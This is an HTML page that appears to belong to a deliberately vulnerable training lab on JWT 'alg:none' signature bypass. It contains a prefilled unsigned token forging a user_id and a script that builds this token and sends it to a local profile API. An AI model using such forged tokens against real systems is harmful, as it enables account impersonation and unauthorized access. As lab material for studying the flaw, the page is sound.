<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SSO Identity | JWT Session Authenticator (Scenario 8)</title>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Plus Jakarta Sans', sans-serif; background: #080712; color: #e2e8f0; margin: 0; padding: 40px; }
    .card { max-width: 650px; margin: 0 auto; background: #110e26; border: 1px solid #231b4d; border-radius: 12px; padding: 30px; }
    h2 { color: #38bdf8; margin-top: 0; }
    .form-group { margin-bottom: 16px; }
    label { display: block; font-size: 0.85rem; color: #94a3b8; margin-bottom: 6px; }
    input, textarea { width: 100%; padding: 10px; background: #080712; border: 1px solid #332773; border-radius: 6px; color: #fff; font-family: 'JetBrains Mono', monospace; }
    button { background: #38bdf8; color: #000; font-weight: 700; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; margin-top: 10px; margin-right: 8px; }
    button:hover { background: #0284c7; }
    pre { background: #04030a; padding: 16px; border-radius: 6px; color: #38bdf8; overflow-x: auto; font-family: 'JetBrains Mono', monospace; }
    .badge { background: rgba(56, 189, 248, 0.15); color: #38bdf8; padding: 4px 10px; border-radius: 4px; font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; }
    .header-bar { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #231b4d; padding-bottom: 16px; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header-bar">
      <h2>SSO Identity Authenticator</h2>
      <span class="badge">Python PyJWT / v8</span>
    </div>
    <p style="color:#94a3b8; font-size:0.9rem;">Scenario 8: JWT Signature Removal / Alg None Inspection</p>

    <div class="form-group">
      <label>Authorization Bearer Token (JWT)</label>
      <textarea id="jwt" rows="4">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjo5OTUwNDMyMDJ9.</textarea>
    </div>
    <button onclick="authenticate()">Authenticate & Fetch Profile</button>
    <button onclick="generateAlgNone()" style="background:#a78bfa; color:#000;">Build Unsigned alg:none Token</button>

    <h3 style="margin-top:24px; font-size:0.95rem;">API Response Output</h3>
    <pre id="output">// Results will appear here</pre>

    <div style="margin-top:20px; text-align:right;">
      <a href="/scenario/8/code" target="_blank" style="color:#a855f7; text-decoration:none; font-size:0.85rem; font-family:'JetBrains Mono';">🔍 Inspect Python JWT Source Code (/code)</a>
    </div>
  </div>

  <script>
    async function authenticate() {
      const token = document.getElementById('jwt').value.trim();
      try {
        const res = await fetch('/api/v8/user/profile', {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        const data = await res.json();
        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
      } catch(e) { document.getElementById('output').textContent = e.message; }
    }

    function generateAlgNone() {
      // Header: {"alg":"none","typ":"JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
      // Payload: {"user_id":995043202} -> eyJ1c2VyX2lkIjo5OTUwNDMyMDJ9
      document.getElementById('jwt').value = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjo5OTUwNDMyMDJ9.";
    }
  </script>
</body>
</html>
